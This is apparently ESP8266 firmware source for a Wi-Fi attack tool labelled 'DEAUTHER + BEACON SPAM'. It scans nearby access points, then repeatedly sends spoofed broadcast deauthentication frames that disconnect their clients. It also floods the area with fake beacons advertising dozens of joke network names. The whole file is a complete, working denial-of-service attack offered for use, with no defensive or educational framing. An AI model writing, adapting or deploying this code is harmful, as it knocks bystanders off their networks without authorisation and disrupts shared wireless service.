#include <ESP8266WiFi.h>

extern "C" {
  #include <user_interface.h>
}

#define MAX_APS 20
#define CHANNEL_LIST_SIZE 3

const uint8_t channels[] = {1, 6, 11};

uint8_t targetBSSID[MAX_APS][6];
uint8_t targetChannel[MAX_APS];
int networkCount = 0;

volatile uint32_t sendOk = 0, sendFail = 0, txDone = 0, beaconCount = 0, deauthCount = 0;
unsigned long lastReport = 0, lastBlink = 0, sessionStart = 0;
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;
uint32_t attackTime = 0;
uint32_t packetCounter = 0;
uint32_t packetRateTime = 0;

uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

char emptySSID[32];
uint8_t macAddr[6];
int ssidNum = 1;

const char ssids[] PROGMEM = {
  "Mom Use This One\n"
  "Abraham Linksys\n"
  "Benjamin FrankLAN\n"
  "Martin Router King\n"
  "John Wilkes Bluetooth\n"
  "Pretty Fly for a Wi-Fi\n"
  "Bill Wi the Science Fi\n"
  "I Believe Wi Can Fi\n"
  "Tell My Wi-Fi Love Her\n"
  "No More Mister Wi-Fi\n"
  "LAN Solo\n"
  "The LAN Before Time\n"
  "Silence of the LANs\n"
  "House LANister\n"
  "Winternet Is Coming\n"
  "Ping’s Landing\n"
  "The Ping in the North\n"
  "This LAN Is My LAN\n"
  "Get Off My LAN\n"
  "The Promised LAN\n"
  "The LAN Down Under\n"
  "FBI Surveillance Van 4\n"
  "Area 51 Test Site\n"
  "Drive-By Wi-Fi\n"
  "Planet Express\n"
  "Wu Tang LAN\n"
  "Darude LANstorm\n"
  "Never Gonna Give You Up\n"
  "Hide Yo Kids, Hide Yo Wi-Fi\n"
  "Loading…\n"
  "Searching…\n"
  "VIRUS.EXE\n"
  "Virus-Infected Wi-Fi\n"
  "Starbucks Wi-Fi\n"
  "Text ###-#### for Password\n"
  "Yell ____ for Password\n"
  "The Password Is 1234\n"
  "Free Public Wi-Fi\n"
  "No Free Wi-Fi Here\n"
  "Get Your Own Damn Wi-Fi\n"
  "It Hurts When IP\n"
  "Dora the Internet Explorer\n"
  "404 Wi-Fi Unavailable\n"
  "Porque-Fi\n"
  "Titanic Syncing\n"
  "Test Wi-Fi Please Ignore\n"
  "Drop It Like It’s Hotspot\n"
  "Life in the Fast LAN\n"
  "The Creep Next Door\n"
  "Ye Olde Internet\n"
};

uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00,
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
  0xe8, 0x03,
  0x31, 0x00,
  0x00, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x01, 0x08,
  0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01,
  0x01,
  0x30, 0x18,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x02, 0x00,
  0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x00, 0x00
};

void scanNetworks();
void nextChannel();
void randomMac();
void sendDeauthBurst();
void handleSerial();
void ICACHE_RAM_ATTR tx_done_cb(uint8_t status) { txDone++; }

void nextChannel() {
  uint8_t ch = channels[channelIndex];
  channelIndex++;
  if (channelIndex >= CHANNEL_LIST_SIZE) channelIndex = 0;
  if (ch != wifi_channel && ch >= 1 && ch <= 14) {
    wifi_channel = ch;
    wifi_set_channel(wifi_channel);
  }
}

void randomMac() {
  for (int i = 0; i < 6; i++) {
    macAddr[i] = os_random() & 0xFF;
  }
}

void sendDeauthBurst() {
  for (int i = 0; i < networkCount; i++) {
    if (targetChannel[i] != wifi_channel) continue;
    for (int j = 0; j < 10; j++) {
      uint8_t pkt[26] = {
        0xC0, 0x00, 0x00, 0x00,
        broadcast[0], broadcast[1], broadcast[2], broadcast[3], broadcast[4], broadcast[5],
        targetBSSID[i][0], targetBSSID[i][1], targetBSSID[i][2], targetBSSID[i][3], targetBSSID[i][4], targetBSSID[i][5],
        targetBSSID[i][0], targetBSSID[i][1], targetBSSID[i][2], targetBSSID[i][3], targetBSSID[i][4], targetBSSID[i][5],
        0x00, 0x00,
        0x07, 0x00
      };
      if (wifi_send_pkt_freedom(pkt, sizeof(pkt), 0) == 0) { sendOk++; deauthCount++; } else sendFail++;
      delay(1);
    }
  }
}

void setup() {
  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
  randomSeed(os_random());
  randomMac();

  Serial.begin(115200);
  delay(100);
  Serial.println();
  Serial.println("=== DEAUTHER + BEACON SPAM (MAIN) ===");
  Serial.println("Commands: /scan /status /help");

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  WiFi.mode(WIFI_OFF);
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(channels[0]);
  wifi_register_send_pkt_freedom_cb(tx_done_cb);

  scanNetworks();

  sessionStart = millis();
  attackTime = millis();
}

void loop() {
  unsigned long now = millis();
  handleSerial();

  if (now - attackTime > 100) {
    attackTime = now;

    nextChannel();
    sendDeauthBurst();

    int i = 0;
    int j = 0;
    char tmp;
    int ssidsLen = strlen_P(ssids);

    while (i < ssidsLen) {
      j = 0;
      do {
        tmp = pgm_read_byte(ssids + i + j);
        j++;
      } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);

      uint8_t ssidLen = j - 1;

      macAddr[5] = ssidNum;
      ssidNum++;
      if (ssidNum > 250) ssidNum = 1;

      memcpy(&beaconPacket[10], macAddr, 6);
      memcpy(&beaconPacket[16], macAddr, 6);

      memcpy(&beaconPacket[38], emptySSID, 32);
      memcpy_P(&beaconPacket[38], &ssids[i], ssidLen);

      beaconPacket[82] = wifi_channel;

      for (int k = 0; k < 3; k++) {
        if (wifi_send_pkt_freedom(beaconPacket, sizeof(beaconPacket), 0) == 0) { sendOk++; beaconCount++; } else sendFail++;
        delay(1);
      }

      i += j;
    }
  }

  if (now - packetRateTime > 1000) {
    packetRateTime = now;
    Serial.printf("Packets/s: %lu\n", (unsigned long)packetCounter);
    packetCounter = 0;
  }

  if (now - lastReport >= 3000) {
    lastReport = now;
    Serial.printf("[STAT] ok=%lu fail=%lu tx=%lu beacon=%lu deauth=%lu ch=%u ap=%d/%d uptime=%lus\n",
                  (unsigned long)sendOk, (unsigned long)sendFail, (unsigned long)txDone,
                  (unsigned long)beaconCount, (unsigned long)deauthCount, wifi_get_channel(),
                  networkCount, networkCount,
                  (unsigned long)((now - sessionStart) / 1000));
  }

  if (now - lastBlink >= 50) {
    lastBlink = now;
    digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
  }
}

void scanNetworks() {
  Serial.println("--- Scanning ---");
  int n = WiFi.scanNetworks();
  if (n <= 0) {
    networkCount = 0;
    Serial.println("No networks found");
    return;
  }
  if (n > MAX_APS) n = MAX_APS;
  networkCount = n;
  for (int i = 0; i < n; i++) {
    memcpy(targetBSSID[i], WiFi.BSSID(i), 6);
    targetChannel[i] = WiFi.channel(i);
    Serial.printf("  %d: %s ch%d %s (%ddBm)\n", i + 1,
                  WiFi.SSID(i).c_str(), targetChannel[i],
                  WiFi.BSSIDstr(i).c_str(), WiFi.RSSI(i));
  }
  WiFi.scanDelete();
  Serial.printf("Scanned %d APs\n", networkCount);
}

void handleSerial() {
  static String input = "";
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n') {
      input.trim();
      if (input.length() > 0) {
        if (input.startsWith("/scan")) {
          scanNetworks();
        } else if (input.startsWith("/status")) {
          unsigned long elapsed = (millis() - sessionStart) / 1000;
          Serial.printf("[STATUS] APs=%d ch=%d tx=%lu beacon=%lu deauth=%lu ok=%lu fail=%lu uptime=%lus\n",
                        networkCount, wifi_get_channel(), (unsigned long)txDone,
                        (unsigned long)beaconCount, (unsigned long)deauthCount,
                        (unsigned long)sendOk, (unsigned long)sendFail, elapsed);
        } else if (input.startsWith("/help")) {
          Serial.println("/scan /status /help");
        } else {
          Serial.println("Unknown command. Try /help");
        }
      }
      input = "";
    } else {
      input += c;
    }
  }
}